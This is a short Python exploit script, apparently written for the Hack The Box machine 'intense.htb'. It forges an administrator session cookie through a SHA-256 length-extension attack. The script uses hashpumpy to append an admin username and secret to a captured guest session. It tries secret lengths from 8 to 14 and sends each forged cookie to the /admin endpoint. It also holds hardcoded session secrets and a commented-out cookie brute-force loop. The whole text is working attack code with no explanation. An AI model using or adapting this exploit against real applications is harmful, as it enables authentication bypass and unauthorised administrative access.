# test.py
import hashpumpy
import requests
import sqlite3
from hashlib import sha256
from os import listdir, path
import datetime
from hashlib import sha256
from base64 import b64decode, b64encode
from random import randrange
import os

url = "http://intense.htb/admin"

'''
def sign(msg):
    """ Sign message with secret key """
    SECRET = os.urandom(randrange(8, 15))
    return sha256(SECRET + msg).digest()

def generate_sig(session):
    # generate signiature
    a = b64encode(session)
    s =  b64encode(sign(session))
    return a + b'.' + s


url = "http://intense.htb/admin"

while True:
    payload = generate_sig(session).decode()
    cookies = dict(auth=payload)
    response = requests.get(url,cookies=cookies)
    ret = (response.text)
    if "Forbidden" not in ret:
        print(payload)
        print(ret)
'''
byte_asession = b";username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;"
asession = byte_asession.decode()

byte_gsession = b"username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;"
gsession = byte_gsession.decode()


# known has is hex -> bytes -> b64
b64_known_hash = '4uF40RAA+EnwwNCMtQnkEHP/KCjuoVoqqwoPT9mxGvE='

# b64 -> bytes -> hex
# hash
known_hash = b64decode(b64_known_hash).hex()

# msg
b64_msg = b'dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7'
omsg = b64decode(b64_msg).decode()

for k in range(8,15):
    # known_hash 32 bytes / 256 bits
    new_hash,msg = hashpumpy.hashpump(known_hash,omsg,asession,k) 
    
    # msg to string
    m = b64encode(msg).decode()

    #new_hash is in hex
    # hex -> bytes -> b64
    n = bytes.fromhex(new_hash)
    n = b64encode(n).decode()

    payload = m + '.'+n
    cookies = dict(auth=payload)
    response = requests.get(url,cookies=cookies)
    ret = (response.text)
    if "Forbidden" not in ret:
        print(k)
        print(payload)
        print(ret)
